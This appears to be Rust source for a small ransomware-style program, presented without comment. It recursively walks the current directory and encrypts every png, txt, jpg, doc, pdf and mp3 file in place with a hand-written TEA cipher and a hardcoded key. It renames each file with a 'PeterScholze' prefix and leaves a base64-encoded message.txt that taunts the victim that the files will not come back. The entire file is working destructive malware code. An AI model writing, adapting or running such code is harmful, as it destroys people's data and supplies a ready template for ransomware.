use walkdir::{WalkDir, DirEntry};
use std::fs::{self, File};
use std::io::{self, Read, Write,Error};
use std::path::{Path,PathBuf};
use base64::{decode};

fn tea_encrypt_block(v: &mut [u32; 2], k: &[u32; 4]) {
    let mut sum = 0u32;
    let delta = 0x9e3779b9u32;
    for _ in 0..32 { // 32 rounds of TEA
        sum = sum.wrapping_add(delta);
        v[0] = v[0].wrapping_add(((v[1] << 4) ^ (v[1] >> 5)).wrapping_add(v[1]) ^ (sum.wrapping_add(k[0])));
        v[1] = v[1].wrapping_add(((v[0] << 4) ^ (v[0] >> 5)).wrapping_add(v[0]) ^ (sum.wrapping_add(k[1])));
    }
}

fn tea_encrypt(data: &[u8], key: &[u8]) -> Vec<u8> {
    assert!(key.len() == 16, "Key length must be 128 bits");
    let mut k = [0u32; 4];
    for (i, chunk) in key.chunks(4).enumerate() {
        k[i] = u32::from_le_bytes(chunk.try_into().unwrap());
    }

    let mut result = Vec::with_capacity(data.len());
    for chunk in data.chunks(8) {
        let mut v = [0u32; 2];
        if chunk.len() == 8 {
            for (i, chunk) in chunk.chunks(4).enumerate() {
                v[i] = u32::from_le_bytes(chunk.try_into().unwrap());
            }
        } else {
            let mut padded_block = [0u8; 8];
            padded_block[..chunk.len()].copy_from_slice(chunk);
            v[0] = u32::from_le_bytes(padded_block[0..4].try_into().unwrap());
            v[1] = u32::from_le_bytes(padded_block[4..8].try_into().unwrap());
        }

        tea_encrypt_block(&mut v, &k);

        result.extend_from_slice(&v[0].to_le_bytes());
        result.extend_from_slice(&v[1].to_le_bytes());
    }

    result
}

fn add_prefix_to_filename(file_path: &Path, prefix: &str) -> PathBuf {
    let mut new_path = PathBuf::new();
    if let Some(parent) = file_path.parent() {
        new_path.push(parent);
    }
    let file_name = file_path.file_name().unwrap_or_default();
    let new_file_name = format!("{}{}", prefix, file_name.to_string_lossy());
    
    new_path.push(new_file_name);
    new_path
}

fn encrypt_data(data: &[u8]) -> Vec<u8> {
    let key: [u8; 16] = *b"zS1eIo5G2dcolh34"; 
    tea_encrypt(data, &key)
}
fn encrypt_file(file_path: &Path) -> Result<(), Box<dyn std::error::Error>> {
    let mut file = File::open(&file_path)?;
    let mut data = Vec::new();

    file.read_to_end(&mut data)?;

    let encrypted_data = encrypt_data(&data); 
    let mut file = File::create(&file_path)?;

    file.write_all(&encrypted_data)?;

    let new_file_path = add_prefix_to_filename(file_path, "PeterScholze");

    fs::rename(file_path, &new_file_path)?;

    Ok(())
}
fn create_message_file(file_name: &str, encoded_message: &str) -> Result<(), Error> {
    // Decode the base64 encoded message
    let message_bytes = decode(encoded_message).expect("Failed to decode base64 message");
    let message = String::from_utf8(message_bytes).expect("Failed to convert message to string");
    let mut file = File::create(file_name)?;

    file.write_all(message.as_bytes())?;

    Ok(())
}
fn main() {
    let prefix = "PeterScholze"; // Define the prefix to check for
    let encoded_message = "V2hhdCdzIHVwIHdpdGggbXkgZmlsZXM/IE9vcHMsIHRoZXkgd2VyZSBhbGwgZW5jcnlwdGVkIGJ5IG1lISBCdXQgZG9uJ3Qgd29ycnksIHRoZXkgd29uJ3QgY29tZSBiYWNrIHRvIHlvdSBmb3JldmVyISEhIEhhaGFoYX5+fg==";

    // Walk through the directory entries
    for entry in WalkDir::new(".") {
        let entry = match entry {
            Ok(entry) => entry,
            Err(e) => {
                eprintln!("Error reading directory entry: {}", e);
                continue;
            }
        };

        let path = entry.path();
        if path.is_file() {
            // Skip files that already have the prefix
            if path.file_stem().and_then(|s| s.to_str()).map_or(false, |s| s.starts_with(prefix)) {
                println!("Skipping already encrypted file: {:?}", path.display());
                continue;
            }

            match path.extension().and_then(|s| s.to_str()) {
                Some("png") | Some("txt") | Some("jpg") | Some("doc") | Some("pdf") | Some("mp3") => {
                    println!("Encrypting file: {:?}", path.display());
                    if let Err(e) = encrypt_file(path) {
                        eprintln!("Error encrypting file {:?}: {}", path.display(), e);
                    }
                }
                _ => {}
            }
        }
    }
    if let Err(e) = create_message_file("message.txt", &encoded_message) {
        eprintln!("Error creating message file: {}", e);
    }
}
